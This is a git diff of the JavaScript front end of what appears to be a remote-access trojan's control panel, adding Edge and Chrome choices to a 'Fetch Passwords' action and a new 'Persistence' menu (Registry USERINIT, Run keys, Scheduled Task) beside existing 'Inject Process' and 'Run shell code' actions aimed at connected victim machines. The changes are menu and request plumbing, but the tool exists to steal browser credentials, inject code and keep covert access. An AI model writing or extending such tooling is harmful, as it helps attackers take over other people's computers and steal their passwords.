@@ -1,6 +1,8 @@
 import { Loading } from './Loader.js';
 import { SendInjectShellCodeLocal } from './ShellcodeOption.js';
+import { PersistenceOption } from './OptionSettings.js';
   
+
 let chatVisible = false;
 let selectedClient = null;
 
@@ -160,7 +162,7 @@ function handleChat(id) {
   };
 }
 
-function PasswordOption(e, id){
+function PasswordOption(e, id, web){
   e.preventDefault();
   toggleAll("");
   fetch('/passwordsTableIndex')
@@ -172,11 +174,9 @@ function PasswordOption(e, id){
       modal.id = "PasswordMainTable"
       document.body.appendChild(modal);
       
-      FetchPasswords(id).then(data => {
-        console.log(data);
+      FetchPasswords(id, web).then(data => {
         let profileSelection = document.querySelector('#profile-selection');
         for(let profile in data){
-            console.log(profile);
             let option = document.createElement('option');
             option.text = profile;
             option.value = profile;
@@ -293,51 +293,156 @@ function SendInjectByPid(pid,icon,id){
 }
 
 
+function createOptionElement(option) {
+  const li = document.createElement('li');
+  li.style = "padding: 3px;";
+  li.id = "liOptionSettingElement";
+
+  const optionElement = document.createElement('a');
+  optionElement.href = "#";
+  optionElement.textContent = option.name;
+  optionElement.style = "padding: 5px 5px 5px 5px;";
+  if (option.action){
+    optionElement.addEventListener('click', option.action);
+  }
+  li.appendChild(optionElement);
+
+  if (option.subOptions && option.subOptions.length > 0) {
+    const subUl = document.createElement('ul');
+    subUl.style.display = "none";
+    subUl.id = 'SubOptionClientSetting';
+
+    for (let j = 0; j < option.subOptions.length; j++) {
+      const subOptionElement = createOptionElement(option.subOptions[j]); 
+      subUl.appendChild(subOptionElement);
+    }
+
+    li.appendChild(subUl);
+
+    const arrowElement = document.createElement('span');
+    arrowElement.textContent = '▶';
+    arrowElement.style.float = 'right';
+    optionElement.addEventListener('click', function(e) {
+      toggleAllOptionSettings(li);
+      e.stopPropagation();
+      if (subUl.style.display === 'none') {
+        subUl.style.display = 'block';
+      } else {
+        subUl.style.display = 'none';
+      }
+    });
+    optionElement.appendChild(arrowElement);
+  }
+
+  return li;
+}
+
+
 function DisplaySettings(clientDiv, id) {
   let menu = document.getElementById('settings-menu');
-
+  if (menu){
+    menu.remove();
+  }
+  const PersistenceOp = new PersistenceOption(id);
   const options = [
-      { name: "Fetch Passwords", action: (e) => PasswordOption(e, id) },
-      { name: "Inject Process", action: (e) => InjectOption(e, id) },
-      { name: "Run shell code", action: () => SendInjectShellCodeLocal(UploadProcessToInject, id) }
+    { 
+      name: "Fetch Passwords", 
+      action: null,
+      subOptions: [
+        { 
+          name: "Edge", 
+          action: (e) => PasswordOption(e, id, "edge")
+        },
+        { 
+          name: "Chrome", 
+          action: (e) => PasswordOption(e, id, "chrome")
+        }
+      ]
+    },
+    { 
+      name: "Inject Process", 
+      action: (e) => InjectOption(e, id) 
+    },
+    { 
+      name: "Run shell code", 
+      action: () => SendInjectShellCodeLocal(UploadProcessToInject, id) 
+    },
+    { 
+      name: "Persistence", 
+      action: null,
+      subOptions: [
+        { 
+          name: "Registry", 
+          action: null,
+          subOptions: [
+            {
+              name: "USERINIT",
+              action: PersistenceOp.action
+            },
+            {
+              name: "Run (Local User)",
+              action: null
+            },
+            {
+              name: "Run (Local Machine)",
+              action: null
+            }
+          ]
+        },
+        { 
+          name: "Scheduled Task", 
+          action: null
+        }
+      ]
+    },
   ];
 
-  if (!menu) {
-      menu = document.createElement('div');
-      menu.id = "settings-menu";
-      menu.style.display = "none";
+ 
+    menu = document.createElement('div');
+    menu.id = "settings-menu";
+    const ul = document.createElement('ul');
+    ul.style = "margin-bottom: 0px;";
 
-      const ul = document.createElement('ul');
-      ul.style = "margin-bottom: 0px;";
-
-      for (let i = 0; i < options.length; i++) {
-          const li = document.createElement('li');
-          li.style = "padding: 3px;";
-
-          const optionElement = document.createElement('a');
-          optionElement.href = "#";
-          optionElement.textContent = options[i].name;
-          optionElement.style = "padding: 5px 5px 5px 5px;";
-          optionElement.addEventListener('click', options[i].action);
-          li.appendChild(optionElement);
-
-          ul.appendChild(li);
+    for (let i = 0; i < options.length; i++) {
+      const optionElement = createOptionElement(options[i]);
+      const sub = optionElement.querySelector("#SubOptionClientSetting");
+      if (sub) {
+          sub.style.top = (i * 20) + 'px';
       }
+      ul.appendChild(optionElement);
+    }  
 
-      menu.appendChild(ul);
-      clientDiv.appendChild(menu);
-  }
+    menu.appendChild(ul);
+    clientDiv.appendChild(menu);
+}
 
-  if (menu.style.display === 'none') {
-      menu.style.display = 'block';
-  } else {
-      menu.style.display = 'none';
+
+function toggleAllOptionSettings(exclude) {
+  let elements = document.querySelectorAll("#liOptionSettingElement");
+  let rootLi = exclude.closest('li');
+  
+  while (rootLi) {
+    console.log('P');
+    let parentLi = rootLi.parentElement.closest('li');
+    if (!parentLi) {
+      break;
+    }
+    rootLi = parentLi;
   }
+  
+  exclude = rootLi != null ? rootLi : exclude;
+  
+  elements.forEach(element => {
+      if (element != exclude) {
+          let subElements = element.querySelectorAll("#SubOptionClientSetting");
+          subElements.forEach(subElement => subElement.style.display = 'none');
+      }
+  });
 }
 
 
 
-function FetchPasswords(id){
+function FetchPasswords(id, web){
   const loader = new Loading()
   loader.DisplayLoading()
   return fetch("/send_message", {
@@ -345,7 +450,7 @@ function FetchPasswords(id){
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({message:{command: "5df297c2f2da83a8b45cfd012fbf9b3c",type:"Passwords",web:"chrome"}, id: id})
+    body: JSON.stringify({message:{command: "5df297c2f2da83a8b45cfd012fbf9b3c",type:"Passwords",web:web}, id: id})
   })
   .then(response => {
     if (!response.ok) {
